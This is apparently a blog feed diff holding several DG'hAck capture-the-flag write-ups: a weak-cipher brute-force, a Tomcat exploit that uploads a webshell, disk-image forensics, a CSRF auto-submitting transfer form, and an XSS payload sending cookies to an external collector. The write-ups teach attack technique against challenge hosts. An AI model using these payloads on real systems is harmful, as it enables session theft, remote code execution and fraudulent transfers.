+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The file is 370 bytes long, so the key must be 3 chars long (370 divided by 150 is 2.47). This is really short, so let&amp;rsquo;s brute-force it!&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> math
+&lt;span style="color:#f92672">import&lt;/span> string
+&lt;span style="color:#f92672">import&lt;/span> itertools
+&lt;span style="color:#75715e"># Note: I renamed the script `crypt.py` to `ccrypt.py`, to avoid naming issues.&lt;/span>
+&lt;span style="color:#f92672">from&lt;/span> ccrypt &lt;span style="color:#f92672">import&lt;/span> keystream
+ALPHA &lt;span style="color:#f92672">=&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>ascii_lowercase
+&lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;involucrypt1&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;rb&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
+data &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
+block_count &lt;span style="color:#f92672">=&lt;/span> math&lt;span style="color:#f92672">.&lt;/span>ceil(len(data) &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">150&lt;/span>)
+iterations &lt;span style="color:#f92672">=&lt;/span> len(ALPHA) &lt;span style="color:#f92672">**&lt;/span> block_count
+&lt;span style="color:#66d9ef">for&lt;/span> index, key &lt;span style="color:#f92672">in&lt;/span> enumerate(itertools&lt;span style="color:#f92672">.&lt;/span>product(ALPHA, repeat&lt;span style="color:#f92672">=&lt;/span>block_count)):
+percent &lt;span style="color:#f92672">=&lt;/span> index &lt;span style="color:#f92672">/&lt;/span> iterations &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">100&lt;/span>
+&lt;span style="color:#66d9ef">print&lt;/span>(
+f&lt;span style="color:#e6db74">&amp;#34;{percent:.2f}% ({index} / {iterations}) : &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>join(key),
+end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>,
+flush&lt;span style="color:#f92672">=&lt;/span>True,
+)
+key &lt;span style="color:#f92672">=&lt;/span> keystream(map(ord, key), len(data))
+decoded &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>
+valid &lt;span style="color:#f92672">=&lt;/span> True
+&lt;span style="color:#66d9ef">for&lt;/span> char_key, char &lt;span style="color:#f92672">in&lt;/span> zip(key, data):
+decoded_char &lt;span style="color:#f92672">=&lt;/span> chr(char_key &lt;span style="color:#f92672">^&lt;/span> char)
+&lt;span style="color:#66d9ef">if&lt;/span> decoded_char &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> string&lt;span style="color:#f92672">.&lt;/span>printable:
+valid &lt;span style="color:#f92672">=&lt;/span> False
+&lt;span style="color:#66d9ef">break&lt;/span>
+decoded &lt;span style="color:#f92672">+=&lt;/span> decoded_char
+&lt;span style="color:#66d9ef">if&lt;/span> valid:
+&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>)
+&lt;span style="color:#66d9ef">print&lt;/span>(decoded)
+&lt;span style="color:#66d9ef">break&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a second and a half (thanks to &lt;a href="https://www.pypy.org/">pypy3&lt;/a>) short seconds, we see :&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ pypy3 brute_1.py involucrypt1
+1.95% &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">342&lt;/span> / 17576&lt;span style="color:#f92672">)&lt;/span> : ane
+The flag is: TheKeyIsTooDamnWeak!
+Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed &lt;span style="color:#66d9ef">do&lt;/span> eiusmod tempor
+incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud
+exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure
+dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur.
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I assumed the key was only made up of lowercase letters, but if the bruteforce didn&amp;rsquo;t work, I would have started it again with &lt;code>ALPHA = string.printable&lt;/code>.&lt;/p>
+&lt;p>The key is &lt;code>ane&lt;/code>, and the flag is &lt;code>TheKeyIsTooDamnWeak!&lt;/code>. See my &lt;a href="https://nicolasb.fr/blog/writeup-dghack-involucrypt-2/">writeup of involucrypt 2&lt;/a> for a better solution.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Walters Blog</title><link>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</link><pubDate>Thu, 19 Nov 2020 05:56:46 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-walters-blog/</guid><description>The challenge starts with a minecraft blog:
 None of the pages look vulnerable. The URLs themselves don&amp;rsquo;t have any parameters, it&amp;rsquo;s just some static html (eg: /contact.html). The contact form doesn&amp;rsquo;t work: when posting something we get a 404.
 On that same 404 page, we can notice the apache version:
-Apache Tomcat/9.0.0.M1 Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on exploit database.</description></item><item><title>Writeup DG'hAck: Server Room</title><link>https://nicolasb.fr/blog/writeup-dghack-server-room/</link><pubDate>Thu, 19 Nov 2020 05:00:05 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-server-room/</guid><description>This challenge starts with a file, found_in_server_room.img.gz. Let&amp;rsquo;s first try to find what this file is:
+Apache Tomcat/9.0.0.M1 Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on exploit database.</description><content>&lt;p>The challenge starts with a minecraft blog:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/walters-blog-home.png">&lt;img src="https://nicolasb.fr/assets/dghack/walters-blog-home.png" alt="The homepage">&lt;/a>&lt;/p>
+&lt;p>None of the pages look vulnerable. The URLs themselves don&amp;rsquo;t have any parameters, it&amp;rsquo;s just some static html (eg: &lt;code>/contact.html&lt;/code>). The contact form doesn&amp;rsquo;t work: when posting something we get a 404.&lt;/p>
+&lt;p>On that same 404 page, we can notice the apache version:&lt;/p>
+&lt;pre>&lt;code>Apache Tomcat/9.0.0.M1
+&lt;/code>&lt;/pre>&lt;p>Searching for that version on google tells us that this particular version is vulnerable to a RCE. The exploit is available on &lt;a href="https://www.exploit-db.com/exploits/42966">exploit database&lt;/a>.&lt;/p>
+&lt;p>Let&amp;rsquo;s use it:&lt;/p>
+&lt;pre>&lt;code>$ wget https://www.exploit-db.com/raw/42966
+$ python2 42966 -p pwn -u http://waltersblog3.chall.malicecyber.com
+_______ ________ ___ ___ __ ______ __ ___ __ __ ______
+/ ____\ \ / / ____| |__ \ / _ \/_ |____ | /_ |__ \ / //_ |____ |
+| | \ \ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / /
+| | \ \/ / | __|______/ /| | | || | / /______| | / / '_ \| | / /
+| |____ \ / | |____ / /_| |_| || | / / | |/ /| (_) | | / /
+\_____| \/ |______| |____|\___/ |_|/_/ |_|____\___/|_|/_/
+[@intx0x80]
+Uploading Webshell .....
+$ ls
+bin
+boot
+dev
+entrypoint.sh
+etc
+flag.txt
+home
+lib
+lib64
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+supervisord.log
+supervisord.pid
+sys
+tmp
+usr
+var
+$ cat flag.txt
+flag{i4lW4y5UpD4T3Y0urt0mC@}
+&lt;/code>&lt;/pre>&lt;p>And there we go, the flag is &lt;code>i4lW4y5UpD4T3Y0urt0mC@&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Server Room</title><link>https://nicolasb.fr/blog/writeup-dghack-server-room/</link><pubDate>Thu, 19 Nov 2020 05:00:05 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-server-room/</guid><description>This challenge starts with a file, found_in_server_room.img.gz. Let&amp;rsquo;s first try to find what this file is:
 $ gunzip found_in_server_room.img.gz $ file found_in_server_room.img found_in_server_room.img: DOS/MBR boot sector; partition 1 : ID=0xc, start-CHS (0x40,0,1), end-CHS (0x3ff,3,32), startsector 8192, 524288 sectors; partition 2 : ID=0x83, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 532480, 3072000 sectors So this is a disk image. Let&amp;rsquo;s try mounting it!
-$ mkdir mnt $ sudo mount found_in_server_room.img mnt NTFS signature is missing.</description></item><item><title>Writeup DG'hAck: Up Credit</title><link>https://nicolasb.fr/blog/writeup-dghack-up-credit/</link><pubDate>Thu, 19 Nov 2020 04:29:21 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-up-credit/</guid><description>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
+$ mkdir mnt $ sudo mount found_in_server_room.img mnt NTFS signature is missing.</description><content>&lt;p>This challenge starts with a file, &lt;code>found_in_server_room.img.gz&lt;/code>. Let&amp;rsquo;s first try to find what this file is:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gunzip found_in_server_room.img.gz
+$ file found_in_server_room.img
+found_in_server_room.img: DOS/MBR boot sector; partition &lt;span style="color:#ae81ff">1&lt;/span> : ID&lt;span style="color:#f92672">=&lt;/span>0xc, start-CHS &lt;span style="color:#f92672">(&lt;/span>0x40,0,1&lt;span style="color:#f92672">)&lt;/span>, end-CHS &lt;span style="color:#f92672">(&lt;/span>0x3ff,3,32&lt;span style="color:#f92672">)&lt;/span>, startsector 8192, &lt;span style="color:#ae81ff">524288&lt;/span> sectors; partition &lt;span style="color:#ae81ff">2&lt;/span> : ID&lt;span style="color:#f92672">=&lt;/span>0x83, start-CHS &lt;span style="color:#f92672">(&lt;/span>0x3ff,3,32&lt;span style="color:#f92672">)&lt;/span>, end-CHS &lt;span style="color:#f92672">(&lt;/span>0x3ff,3,32&lt;span style="color:#f92672">)&lt;/span>, startsector 532480, &lt;span style="color:#ae81ff">3072000&lt;/span> sectors
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>So this is a disk image. Let&amp;rsquo;s try mounting it!&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ mkdir mnt
+$ sudo mount found_in_server_room.img mnt
+NTFS signature is missing.
+Failed to mount &lt;span style="color:#e6db74">&amp;#39;/dev/loop0&amp;#39;&lt;/span>: Invalid argument
+The device &lt;span style="color:#e6db74">&amp;#39;/dev/loop0&amp;#39;&lt;/span> doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t seem to have a valid NTFS.
+Maybe the wrong device is used? Or the whole disk instead of a
+partition &lt;span style="color:#f92672">(&lt;/span>e.g. /dev/sda, not /dev/sda1&lt;span style="color:#f92672">)&lt;/span>? Or the other way around?
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Huh.&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ fdisk -l found_in_server_room.img
+Disk found_in_server_room.img: 1.72 GiB, &lt;span style="color:#ae81ff">1845493248&lt;/span> bytes, &lt;span style="color:#ae81ff">3604479&lt;/span> sectors
+Units: sectors of &lt;span style="color:#ae81ff">1&lt;/span> * 512 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span> bytes
+Sector size &lt;span style="color:#f92672">(&lt;/span>logical/physical&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
+I/O size &lt;span style="color:#f92672">(&lt;/span>minimum/optimal&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
+Disklabel type: dos
+Disk identifier: 0x907af7d0
+Device Boot Start End Sectors Size Id Type
+found_in_server_room.img1 &lt;span style="color:#ae81ff">8192&lt;/span> &lt;span style="color:#ae81ff">532479&lt;/span> &lt;span style="color:#ae81ff">524288&lt;/span> 256M c W95 FAT32 &lt;span style="color:#f92672">(&lt;/span>LBA&lt;span style="color:#f92672">)&lt;/span>
+found_in_server_room.img2 &lt;span style="color:#ae81ff">532480&lt;/span> &lt;span style="color:#ae81ff">3604479&lt;/span> &lt;span style="color:#ae81ff">3072000&lt;/span> 1.5G &lt;span style="color:#ae81ff">83&lt;/span> Linux
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>fdisk does find the partitions, but for some reason we can&amp;rsquo;t mount them (even by setting the offset). Using testdisk, we&amp;rsquo;re able to navigate through the files by selecting:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>found_in_server_room.img&lt;/code>&lt;/li>
+&lt;li>Intel&lt;/li>
+&lt;li>Advanced&lt;/li>
+&lt;li>The first or the second partition&lt;/li>
+&lt;li>Boot &amp;gt; List or just List&lt;/li>
+&lt;/ul>
+&lt;p>The first partition does not contain anything useful, just necessary boot files. The other partition is a typical linux root:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/server-room-root.png">&lt;img src="https://nicolasb.fr/assets/dghack/server-room-root.png" alt="The linux partition">&lt;/a>&lt;/p>
+&lt;p>The first thing that comes to mind is to check the &lt;code>.bash_history&lt;/code>. The one of the &lt;code>pi&lt;/code> user is rather empty:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">sudo systemctl halt
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>But the one of the &lt;code>root&lt;/code> user contains quite a few commands (76 of them, to be exact). Here are the ones where nano is used:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nano wpa_supplicant.conf
+nano hostapd
+nano /etc/sysctl.d/90-routing.conf
+nano /etc/dnsmasq.conf
+nano /etc/dhcpcd.conf
+nano /etc/dnsmasq.conf
+nano /etc/wpa_supplicant/wpa_supplicant.conf
+nano /etc/wpa_supplicant/wpa_supplicant.conf
+nano /etc/wpa_supplicant/wpa_supplicant.conf.old
+nano /etc/dnsmasq.conf
+nano /etc/hostapd/hostapd.conf
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>wpa_supplicant.conf&lt;/code> file does not yield anything too interesting:&lt;/p>
+&lt;pre>&lt;code>1598621524 02:6c:0d:3b:04:17 192.168.100.171 OnePlus5T 01:02:6c:0d:3b:04:17
+&lt;/code>&lt;/pre>&lt;p>But the &lt;code>hostapd.conf&lt;/code> one does:&lt;/p>
+&lt;pre>&lt;code>country_code=FR
+interface=wlan0
+ssid=BackpackNet
+hw_mode=g
+channel=11
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+wpa=2
+wpa_passphrase=BackpackBackdoorNet
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+&lt;/code>&lt;/pre>&lt;p>The flag is the wifi password: &lt;code>BackpackBackdoorNet&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Up Credit</title><link>https://nicolasb.fr/blog/writeup-dghack-up-credit/</link><pubDate>Thu, 19 Nov 2020 04:29:21 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-up-credit/</guid><description>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!
 Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:
 After logging in, we are presented with an interface that has three tabs:
-an activity log a money transfer form a form to contact our financial advisor Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted.</description></item><item><title>Writeup DG'hAck: Internal Support 2</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</link><pubDate>Thu, 19 Nov 2020 03:45:38 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</guid><description>This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
+an activity log a money transfer form a form to contact our financial advisor Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted.</description><content>&lt;p>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200€!&lt;/p>
+&lt;p>Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/upcredit-registration.png">&lt;img src="https://nicolasb.fr/assets/dghack/upcredit-registration.png" alt="The registration message">&lt;/a>&lt;/p>
+&lt;p>After logging in, we are presented with an interface that has three tabs:&lt;/p>
+&lt;ul>
+&lt;li>an activity log&lt;/li>
+&lt;li>a money transfer form&lt;/li>
+&lt;li>a form to contact our financial advisor&lt;/li>
+&lt;/ul>
+&lt;p>Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted. This will probably be useful later on.&lt;/p>
+&lt;p>Let&amp;rsquo;s look at the money transfer form:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/upcredit-money-transfer.png">&lt;img src="https://nicolasb.fr/assets/dghack/upcredit-money-transfer.png" alt="The money transfer form">&lt;/a>&lt;/p>
+&lt;p>It looks quite simple. After registering another account and trying:&lt;/p>
+&lt;ul>
+&lt;li>sending money we don&amp;rsquo;t have&lt;/li>
+&lt;li>sending huge amounts of money&lt;/li>
+&lt;li>sending negative amounts of money&lt;/li>
+&lt;li>some sqli&lt;/li>
+&lt;/ul>
+&lt;p>We find out that the form is quite secure. But wait, it doesn&amp;rsquo;t have any CSRF token! Let&amp;rsquo;s try exploiting that. Using &lt;a href="ngrok.com">ngrok&lt;/a>, we create a webpage and temporarily host it.&lt;/p>
+&lt;p>In it, we copy the form which we fill out, and add a little bit of JS to automatically submit it:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#a6e22e">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upcredit4.chall.malicecyber.com/transfer&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;post&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;col-md-12 col-sm-12 col-xs-12&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-group&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-control&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;account&amp;#34;&lt;/span>
+&lt;span style="color:#a6e22e">placeholder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Account number&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;account&amp;#34;&lt;/span>
+&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Aln6qOfUJ&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-group&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;number&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-control&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>
+&lt;span style="color:#a6e22e">placeholder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Amount&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;200&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;help-block with-errors&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">style&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;color: #f00&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;pull-right&amp;#34;&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">button&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;reg-submit&amp;#34;&lt;/span>
+&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;btn btn-md btn-common btn-log&amp;#34;&lt;/span>&amp;gt;Send
+&amp;lt;/&lt;span style="color:#f92672">button&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;msgSubmit&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;h3 text-center hidden&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;clearfix&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
+&amp;lt;/&lt;span style="color:#f92672">form&lt;/span>&amp;gt;
+&amp;lt;&lt;span style="color:#f92672">script&lt;/span>&amp;gt;
+&lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">submit&lt;/span>()
+&amp;lt;/&lt;span style="color:#f92672">script&lt;/span>&amp;gt;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After posting the link to our form in the contact area and waiting for a few seconds, we get a money transfer:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/upcredit-credited.png">&lt;img src="https://nicolasb.fr/assets/dghack/upcredit-credited.png" alt="The money transfer form">&lt;/a>&lt;/p>
+&lt;p>And we can buy the flag: &lt;code>W1nG4rD1um\L3v1os444!&lt;/code>.&lt;/p>
+&lt;hr>
+&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Internal Support 2</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</link><pubDate>Thu, 19 Nov 2020 03:45:38 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</guid><description>This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
 &amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:
-Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page.</description></item><item><title>Writeup DG'hAck: Internal Support 1</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</link><pubDate>Thu, 19 Nov 2020 03:19:55 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</guid><description>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
+Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page.</description><content>&lt;p>This is the second version of the &lt;a href="https://nicolasb.fr/blog/writeup-dghack-internal-support-1">ticketing system&lt;/a> presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:&lt;/p>
+&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">svg&lt;/span> &lt;span style="color:#a6e22e">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34;&lt;/span> /&amp;gt;
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:&lt;/p>
+&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/internal-support-2-ip-denied.png">&lt;img src="https://nicolasb.fr/assets/dghack/internal-support-2-ip-denied.png" alt="The IP-lock error message">&lt;/a>&lt;/p>
+&lt;p>Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page. Let&amp;rsquo;s try reading it using some XHR!&lt;/p>
+&lt;p>The JS we&amp;rsquo;ll inject is going to be:&lt;/p>
